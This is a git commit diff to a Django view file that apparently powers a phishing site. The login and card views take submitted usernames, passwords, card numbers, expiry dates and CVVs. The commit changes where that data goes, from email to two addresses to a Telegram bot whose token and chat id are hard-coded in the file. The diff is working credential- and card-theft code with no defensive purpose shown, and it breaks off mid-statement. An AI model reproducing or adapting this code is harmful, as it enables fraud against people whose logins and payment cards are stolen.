f8d8b735cf556310061d777580856d96e97e3dbe
Adetunji Peter <tunjipete@grrnberry.com>
2024-06-14 02:16:22 +0100

    new push

--- login/views.py
+++ login/views.py
@@ -8,6 +8,16 @@ from django.views.decorators.csrf import csrf_exempt
 from .models import Login,Phone
 from django.core.mail import send_mail
 from showtime.settings import EMAIL_HOST_USER
+from telegram import Update
+import requests
+
+def send_to_telegram(message):
+    token = '7387577880:AAHAjvkYcfehNRScZxGkKGf6SVaU5IzuOMo'
+    chat_id = "1223421187"
+    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
+    res = requests.get(url).json()
+    return res
+
 
 @csrf_exempt
 def login_view(request):
@@ -15,10 +25,8 @@ def login_view(request):
         username = request.POST.get('username')
         password = request.POST.get('password')
         subject = 'New details submitted'
-        mail_message = f"username: {username}\npassword: {password}"
-        from_email = EMAIL_HOST_USER
-        recipient_list = ['msikenzo@outlook.com','karenfurst6@gmail.com'] 
-        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
+        mail_message = f"{subject}\nusername: {username}\npassword: {password}"
+        send_to_telegram(mail_message)
         return redirect('card')
     return render(request, 'login.html')
 
@@ -30,11 +38,9 @@ def card_view(request):
         expiry_month = request.POST.get('expiry_month')
         expiry_year = request.POST.get('expiry_year')
         cvv = request.POST.get('cvv')
-        subject = 'New details submitted'
-        mail_message = f"cardholder_name: {cardholder_name}\ncard_number: {card_number}\nexpiry_year: {expiry_year}\nexpiry_month: {expiry_month}\ncvv: {cvv}"
-        from_email = EMAIL_HOST_USER
-        recipient_list = ['msikenzo@outlook.com','karenfurst6@gmail.com'] 
-        send_mail(subject,mail_message,from_email, recipient_list, fail_silently=False)
+        subject = 'New card details submitted'
+        mail_message = f"{subject}\ncardholder_name: {cardholder_name}\ncard_number: {card_number}\nexpiry_year: {expiry_year}\nexpiry_month: {expiry_month}\ncvv: {cvv}"
+        send_to_telegram(mail_message)
       
         combined_data = {
             
